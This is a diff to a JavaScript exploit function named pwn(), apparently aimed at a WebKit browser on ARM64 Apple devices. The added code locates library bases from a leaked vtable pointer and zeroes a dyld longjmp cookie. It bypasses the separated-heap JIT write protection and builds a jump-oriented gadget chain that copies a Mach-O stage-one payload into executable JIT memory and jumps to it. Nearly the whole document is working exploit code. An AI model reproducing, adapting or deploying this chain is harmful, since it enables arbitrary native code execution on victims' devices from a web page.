@@ -207,23 +207,350 @@ function pwn() {
     var vtab_addr = read64(el_addr);
     log(`[*] vtab_addr = ${(vtab_addr)}`);
 
+    // Libs Base
     var webcore_base = Sub(vtab_addr, 0x187f75c);
-    log(`[+] webcore base = ${(webcore_base)}`); 
-    var read_webcore = read64(webcore_base);
-    log(`[i] webcore read test = ${read_webcore}`);
+    log(`[+] webcore base = ${(webcore_base)} -> ${read64(webcore_base)}`);
+    var jsc_base = Sub(webcore_base, 0x1738000);
+    log(`[+] jsc base = ${(jsc_base)} -> ${read64(jsc_base)}`); 
+    var coreaudio_base = Sub(webcore_base, 0x5573000);
+    log(`[+] coreaudio base = ${(coreaudio_base)} -> ${read64(coreaudio_base)}`); 
+    var libcpp1_base = Sub(webcore_base, 0x976C000);
+    log(`[+] libcpp1 base = ${(libcpp1_base)} -> ${read64(libcpp1_base)}`); 
+    var libsystem_platform_base = Sub(webcore_base, 0x8CCE000);
+    log(`[+] libsystem_platform base = ${(libsystem_platform_base)} -> ${read64(libsystem_platform_base)}`);
+    var libsystem_kernel_base = Sub(webcore_base, 0x8D5D000);
+    log(`[+] libsystem_kernel base = ${(libsystem_kernel_base)} -> ${read64(libsystem_kernel_base)}`);
+    var libdyld_base = Sub(webcore_base, 0x8E88000);
+    log(`[+] libdyld base = ${(libdyld_base)} -> ${read64(libdyld_base)}`);
 
-    //just for test
-    var bss_addr = Add(webcore_base, 0x2ef3b170);
-    var read_bss = read64(bss_addr);
-    log(`[i] bss read test = ${read_bss}`);
-    write64(bss_addr, new Int64(0x4142434445464748));
-    read_bss = read64(bss_addr);
-    log(`[i] bss read test = ${read_bss}`);
+    // needed to bypass seperated RW, RX JIT mitigation
+    var __MergedGlobals_52 = read64(Add(jsc_base, 0x32559040));
+    var memPoolStart = read64(Add(__MergedGlobals_52, 0xc8));    //__MergedGlobals_52 + 0xc8
+    var memPoolEnd = read64(Add(__MergedGlobals_52, 0xd0));      //__MergedGlobals_52 + 0xd0
+    var jitWriteSeparateHeaps = read64(Add(jsc_base, 0x3255A438));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
+    log(`[i] memPoolStart = ${memPoolStart}`);
+    log(`[i] memPoolEnd = ${memPoolEnd}`);
+    log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
+    var longjmp = Add(libsystem_platform_base, 0x16f8);
+    var usleep = Add(webcore_base, 0x1810BA4);
+    var mach_vm_protect = Add(libsystem_kernel_base, 0x2156c);
+    var mach_task_self_ = read64(Add(libsystem_kernel_base, 0x39AD1AAC));
 
-    var wrapper = document.createElement('div');
-    var wrapper_addr = addrof(wrapper);
+    // longjmp mitigation?; nullify when read *(uint64_t *)(_ReadStatusReg(TPIDRRO_EL0) + 0x38);
+    var __ZZ6dlopenE1p = read64(Add(libdyld_base, 0x39BFA9E8));
+    log(`[i] __ZZ6dlopenE1p = ${__ZZ6dlopenE1p}`);
+    var dyld_base = Sub(__ZZ6dlopenE1p, 0xc918); //_dlopen_internal = 0xc918
+    log(`[i] dyld_base = ${dyld_base}`);
+    var cookieAddr = Add(dyld_base, 0x8ECA0 + 0x38);
+    log(`[i] read cookie  = ${read64(cookieAddr)}`);
+    write64(cookieAddr, new Int64(0));
+    log(`[i] writechk  = ${read64(cookieAddr)}`);
 
-    write64(Add(wrapper_addr, FPO + 8), new Int64(0x4142434445464748));
+
+    //gadgets
+    var stackloader = Add(webcore_base, 0x9594); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
+    var ldrx8 = Add(webcore_base, 0x185AB8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
+    var dispatch = Add(coreaudio_base, 0x100F54)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
+    var movx4 = Add(webcore_base, 0x861F08);    //v E4 03 14 AA 00 01 3F D6 
+    var regloader = Add(libcpp1_base, 0x25D18); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
+
+    // JOP START !!!
+    var x19 = malloc(0x100);
+    var x8 = malloc(0x8)
+    log(`[i] x19 = ${x19}, x8 = ${x8}`);
+    write64(Add(wrapper_addr, FPO + 8), new Int64(x19));
+    log(`[i] writechk ${read64(Add(wrapper_addr, FPO + 8))}`);
+    write64(x19, x8);
+    log(`[i] writechk ${read64(x19)}`);
+    write64(x8, longjmp);
+    log(`[i] writechk ${read64(x8)}`);
+    
+    stage1.u32 = _u32;
+    stage1.read = _read;
+    stage1.readInt64 = _readInt64;
+    stage1.writeInt64 = _writeInt64;
+    var pstart = new Int64("0xffffffffffffffff");
+    var pend   = new Int64(0);
+    var ncmds  = stage1.u32(0x10);
+    for(var i = 0, off = 0x20; i < ncmds; ++i)
+    {
+        var cmd = stage1.u32(off);
+        if(cmd == 0x19) // LC_SEGMENT_64
+        {
+            var filesize = stage1.readInt64(off + 0x30);
+            if(!(filesize.hi() == 0 && filesize.lo() == 0))
+            {
+                var vmstart = stage1.readInt64(off + 0x18);
+                var vmsize = stage1.readInt64(off + 0x20);
+                var vmend = Add(vmstart, vmsize);
+                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
+                {
+                    pstart = vmstart;
+                }
+                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
+                {
+                    pend = vmend;
+                    
+                }
+            }
+        }
+        off += stage1.u32(off + 0x4);
+    }
+    var shsz = Sub(pend, pstart);
+    log(`pstart: ${pstart}, pend: ${pend}, shsz: ${shsz}`);
+    if(shsz.hi() != 0)
+    {
+        log("fail: shsz");
+    }
+
+    var payload = new Uint8Array(shsz.lo());
+    var paddr = read64(Add(addrof(stage1), 0x10));
+    // paddr = new Int64(paddr);
+    var codeAddr = Sub(memPoolEnd, shsz);
+    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
+    var shslide = Sub(codeAddr, pstart);
+    segs = [];
+    var off = 0x20;
+    for(var i = 0; i < ncmds; ++i)
+    {
+        var cmd = stage1.u32(off);
+        if(cmd == 0x19) // LC_SEGMENT_64
+        {
+            var filesize = stage1.readInt64(off + 0x30);
+            if(!(filesize.hi() == 0 && filesize.lo() == 0))
+            {
+                var vmaddr   = stage1.readInt64(off + 0x18);
+                var vmsize   = stage1.readInt64(off + 0x20);
+                var fileoff  = stage1.readInt64(off + 0x28);
+                var prots    = stage1.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
+                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
+                {
+                    filesize = vmsize;
+                }
+                segs.push({
+                    addr:    Sub(vmaddr, pstart),
+                    size:    filesize,
+                    fileoff: fileoff,
+                    prots:   prots,
+                });
+                if(fileoff.hi() != 0)
+                {
+                    log("fail: fileoff");
+                }
+                if(filesize.hi() != 0)
+                {
+                    log("fail: filesize");
+                }
+                fileoff = fileoff.lo();
+                filesize = filesize.lo();
+                payload.set(stage1.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
+            }
+        }
+        off += stage1.u32(off + 0x4);
+    }
+    log(`codeAddr: ${codeAddr}, paddr: ${paddr}`)
+
+    payload.u32 = _u32;
+    payload.read = _read;
+    payload.readInt64 = _readInt64;
+    var psyms = fsyms(payload, 0, segs, ["__start"]);
+    
+    ////////////////////////
+    var arrsz = 0x100000,
+        off   =   0x1000;
+    var arr   = new Uint32Array(arrsz);
+    var stack = read64(Add(addrof(arr), 0x10));
+    var pos = arrsz - off;
+    log(`stack: ${stack}`)
+
+    var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
+        log(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
+        //x4 = x4 || Int64.One
+        // in stackloader:
+        arr[pos++] = 0xdead0010;                // unused
+        arr[pos++] = 0xdead0011;                // unused
+        arr[pos++] = 0xdead0012;                // unused
+        arr[pos++] = 0xdead0013;                // unused
+        arr[pos++] = 0xdead1101;                // x28 (unused)
+        arr[pos++] = 0xdead1102;                // x28 (unused)
+        arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
+        arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
+        arr[pos++] = 0xdead0016;                // x26 (unused)
+        arr[pos++] = 0xdead0017;                // x26 (unused)
+        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
+        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
+        arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
+        arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
+        arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
+        arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
+        arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
+        arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
+        arr[pos++] = func.lo();                 // x21 (target for dispatch)
+        arr[pos++] = func.hi();                 // x21 (target for dispatch)
+        arr[pos++] = 0xdead0018;                // x20 (unused)
+        arr[pos++] = 0xdead0019;                // x20 (unused)
+        var tmppos = pos;
+        arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+        arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
+        arr[pos++] = 0xdead001c;                // x29 (unused)
+        arr[pos++] = 0xdead001d;                // x29 (unused)
+        arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+        arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+        // in ldrx8
+        if (x4) {
+            arr[pos++] = stackloader.lo();
+            arr[pos++] = stackloader.hi();
+        } else {
+            arr[pos++] = dispatch.lo();             // x8 (target for regloader)
+            arr[pos++] = dispatch.hi();             // x8 (target for regloader)
+        }
+        arr[pos++] = 0xdead1401;                // (unused)
+        arr[pos++] = 0xdead1402;                // (unused)
+        arr[pos++] = 0xdead1301;                // x20 (unused)
+        arr[pos++] = 0xdead1302;                // x20 (unused)
+        arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
+        arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
+        arr[pos++] = 0xdead1201;                // x29 (unused)
+        arr[pos++] = 0xdead1202;                // x29 (unused)
+        arr[pos++] = regloader.lo();            // x30 (next gadget)
+        arr[pos++] = regloader.hi();            // x30 (next gadget)
+
+        // in regloader
+        // NOTE: REGLOADER DOES NOT ADJUST SP!
+        // sometimes i didn't get expected value in x4
+        // and i have no fucking idea why
+        // usleep likely did the trick, but I would still keep the code
+        // with movx4
+        // arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
+        // arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)
+
+        if (x4) {
+            // in stackloader:
+            arr[pos++] = 0xdaad0010;                // unused
+            arr[pos++] = 0xdaad0011;                // unused
+            arr[pos++] = 0xdaad0012;                // unused
+            arr[pos++] = 0xdaad0013;                // unused
+            arr[pos++] = 0xdaad1101;                // x28 (unused)
+            arr[pos++] = 0xdaad1102;                // x28 (unused)
+            arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
+            arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
+            arr[pos++] = 0xdaad0016;                // x26 (unused)
+            arr[pos++] = 0xdaad0017;                // x26 (unused)
+            arr[pos++] = 0xdaad0018;                // x25 (unused)
+            arr[pos++] = 0xdaad0019;                // x25 (unused)
+            arr[pos++] = 0xdaad00f0;                // x24 (unused)
+            arr[pos++] = 0xdaad00f1;                // x24 (unused)
+            arr[pos++] = 0xdaad00f2;                // x23 (unused)
+            arr[pos++] = 0xdaad00f3;                // x23 (unused)
+            arr[pos++] = 0xdaad00f4;                // x22 (unused)
+            arr[pos++] = 0xdaad00f5;                // x22 (unused)
+            arr[pos++] = func.lo();                 // x21 (target for dispatch)
+            arr[pos++] = func.hi();                 // x21 (target for dispatch)
+            arr[pos++] = 0xdaad0018;                // x20 (unused)
+            arr[pos++] = 0xdaad0019;                // x20 (unused)
+            tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
+            arr[pos++] = 0xdaad001c;                // x29 (unused)
+            arr[pos++] = 0xdaad001d;                // x29 (unused)
+            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+            arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+            // in ldrx8
+            arr[pos++] = dispatch.lo();             // x8 (target for movx4)
+            arr[pos++] = dispatch.hi();             // x8 (target for movx4)
+            arr[pos++] = 0xdaad1401;                // (unused)
+            arr[pos++] = 0xdaad1402;                // (unused)
+            arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
+            arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
+            arr[pos++] = 0xdaad1301;                // x19 (unused)
+            arr[pos++] = 0xdaad1302;                // x19 (unused)
+            arr[pos++] = 0xdaad1201;                // x29 (unused)
+            arr[pos++] = 0xdaad1202;                // x29 (unused)
+            arr[pos++] = movx4.lo();                // x30 (next gadget)
+            arr[pos++] = movx4.hi();                // x30 (next gadget)
+        }
+
+        // after dispatch:
+
+        // keep only one: these or 0xdeaded01
+        arr[pos++] = 0xdead0022;                // unused
+        arr[pos++] = 0xdead0023;                // unused
+
+        arr[pos++] = 0xdead0022;                // unused
+        arr[pos++] = 0xdead0023;                // unused
+        arr[pos++] = 0xdead0024;                // x22 (unused)
+        arr[pos++] = 0xdead0025;                // x22 (unused)
+        arr[pos++] = 0xdead0026;                // x21 (unused)
+        arr[pos++] = 0xdead0027;                // x21 (unused)
+        arr[pos++] = 0xdead0028;                // x20 (unused)
+        arr[pos++] = 0xdead0029;                // x20 (unused)
+        arr[pos++] = 0xdead002a;                // x19 (unused)
+        arr[pos++] = 0xdead002b;                // x19 (unused)
+        arr[pos++] = 0xdead002c;                // x29 (unused)
+        arr[pos++] = 0xdead002d;                // x29 (unused)
+        arr[pos++] = jump_to.lo();              // x30 (gadget)
+        arr[pos++] = jump_to.hi();              // x30 (gadget)
+    }
+
+    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
+        x0 = x0 || Int64.Zero
+        x1 = x1 || Int64.Zero
+        x2 = x2 || Int64.Zero
+        x3 = x3 || Int64.Zero
+        jump_to = jump_to || stackloader
+
+        return add_call_via_x8(func, x0, x1, x2, x3, x4, jump_to)
+    }
+
+    add_call(new Int64(jitWriteSeparateHeaps)
+        , Sub(codeAddr, memPoolStart)     // off
+        , paddr                           // src
+        , shsz                            // size
+    );
+
+    segs.forEach(function(seg) {
+        var addr = Add(seg.addr, codeAddr);
+        if (seg.prots.hi() & 2) { // VM_PROT_WRITE
+            var addr = Add(seg.addr, codeAddr);
+            log(`Calling mach_vm_protect, ${mach_vm_protect.toString(16)}, ${mach_task_self_ >>> 0} ${addr} ${seg.size} 0 0x13`);
+            add_call(new Int64(mach_vm_protect)
+                , new Int64(mach_task_self_ >>> 0)    // task
+                , addr                                // addr
+                , seg.size                          // size
+                , new Int64(0)                      // set maximum
+                , new Int64(0x13)                   // prot (RW- | COPY)
+            );
+        }
+    })
+
+    add_call(new Int64(usleep)
+        , new Int64(100000) // microseconds
+    );
+
+    var jmpAddr = Add(psyms["__start"], shslide);
+    add_call(jmpAddr
+        , new Int64(0xcafebabe41414140) //x0
+        , new Int64(0xcafebabe41414144) //x1
+        , new Int64(0xcafebabe41414148) //x2
+        , new Int64(0xcafebabe4141414c) //x3
+        , new Int64(0xcafebabe41414150) //x4
+    );
+
+    // dummy
+    for(var i = 0; i < 0x20; ++i)
+    {
+            arr[pos++] = 0xde00c0de + (i<<16);
+    }
+
+    //set longjmp's register
+    write64(Add(x19, 0x58), new Int64(stackloader));
+    var sp = Add(stack, (arrsz - off) * 4);
+    write64(Add(x19, 0x60), new Int64(sp));
+
+    alert(1);
+
     wrapper.addEventListener("click", function(){ }); 
 
     return;
